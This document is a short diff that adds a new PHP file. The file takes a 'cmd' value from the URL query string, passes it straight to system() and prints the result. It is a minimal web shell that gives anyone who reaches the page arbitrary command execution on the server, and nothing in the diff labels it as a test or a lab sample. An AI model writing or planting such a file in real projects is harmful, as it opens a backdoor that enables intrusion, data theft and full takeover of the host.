@@ -1,0 +1,9 @@
+<?php
+
+
+$s = $_GET[cmd];
+
+echo system($s);
+
+
+?>
